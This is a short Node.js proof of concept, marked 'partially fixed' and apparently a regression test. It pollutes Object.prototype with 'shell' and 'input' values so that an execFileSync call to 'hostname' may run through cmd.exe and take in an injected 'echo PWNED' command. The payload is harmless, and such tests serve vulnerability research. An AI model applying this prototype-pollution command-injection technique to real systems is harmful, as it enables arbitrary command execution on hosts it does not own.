// PARTIALLY FIXED

const { execFileSync } = require('child_process');

Object.prototype.shell = 'cmd.exe.';
Object.prototype.input = 'echo PWNED\n';

const output = execFileSync('hostname', { });
console.log(output.toString());
